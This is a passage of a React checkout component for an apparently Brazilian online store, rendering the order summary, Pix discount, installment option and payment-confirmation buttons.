                  ? <><Loader2 className="h-5 w-5 animate-spin" />Processando...</>
                  : <><Lock className="h-4 w-4" />Confirmar Pagamento</>}
              </button>
              <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 pt-2">
                <ShieldCheck className="h-3.5 w-3.5 text-green-600" />
                Seus dados estão protegidos com SSL
              </div>
            </div>
          </div>

          {/* ── RIGHT: Desktop summary ── */}
          <div className="hidden lg:block lg:col-span-5">
            <div className="bg-white rounded-2xl border border-gray-200 shadow-sm sticky top-20">
              <div className="px-5 py-4 border-b border-gray-100">
                <h2 className="font-bold text-gray-900 text-sm">Resumo da Compra</h2>
              </div>
              <div className="p-5 space-y-3">
                {items.map(item => (
                  <div key={item.id} className="flex gap-3">
                    <div className="w-14 h-14 bg-gray-50 rounded-xl border border-gray-100 flex items-center justify-center shrink-0 p-1.5">
                      <img src={getImagePath(item.mainImage)} alt={item.name} className="w-full h-full object-contain" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-xs font-semibold text-gray-800 line-clamp-2 leading-snug">{item.name}</p>
                      <p className="text-xs text-gray-400 mt-0.5">Qtd: {item.quantity}</p>
                    </div>
                    <div className="text-xs font-bold text-gray-900 shrink-0 pt-0.5">
                      R$ {((paymentMethod === "pix" ? item.pixPrice : item.price) * item.quantity).toFixed(2).replace('.', ',')}
                    </div>
                  </div>
                ))}

                <div className="border-t border-gray-100 pt-3 space-y-2 text-sm">
                  <div className="flex justify-between text-gray-500">
                    <span>Subtotal</span><span>R$ {total.toFixed(2).replace('.', ',')}</span>
                  </div>
                  <div className="flex justify-between text-green-600 font-semibold">
                    <span className="flex items-center gap-1"><Truck className="h-3.5 w-3.5" />Frete</span>
                    <span>Grátis</span>
                  </div>
                  {paymentMethod === "pix" && (
                    <div className="flex justify-between text-green-700 font-semibold">
                      <span>Desconto Pix (10%)</span>
                      <span>- R$ {discount.toFixed(2).replace('.', ',')}</span>
                    </div>
                  )}
                </div>

                <div className="border-t border-gray-100 pt-3 flex justify-between items-center">
                  <span className="font-bold text-gray-900">Total</span>
                  <div className="text-right">
                    <div className="font-black text-2xl" style={{ color: "#E09400" }}>
                      R$ {finalTotal.toFixed(2).replace('.', ',')}
                    </div>
                    {paymentMethod === "card" && (
                      <div className="text-xs text-gray-500">ou 5x de R$ {(total / 5).toFixed(2).replace('.', ',')} s/ juros</div>
                    )}
                  </div>
                </div>

                <button
                  className="w-full py-4 rounded-xl font-bold text-base text-white transition-all hover:opacity-90 active:scale-95 flex items-center justify-center gap-2 disabled:opacity-60 mt-1"
                  style={{ background: "linear-gradient(135deg, #15803d, #22c55e)" }}
                  onClick={handleCheckout}
                  disabled={processing}
                >
                  {processing
                    ? <><Loader2 className="h-5 w-5 animate-spin" />Processando...</>
                    : <><Lock className="h-4 w-4" />Confirmar Pagamento</>}
                </button>

                <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 pt-1">
                  <ShieldCheck className="h-3.5 w-3.5 text-green-600" />
                  Seus dados estão protegidos com SSL
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
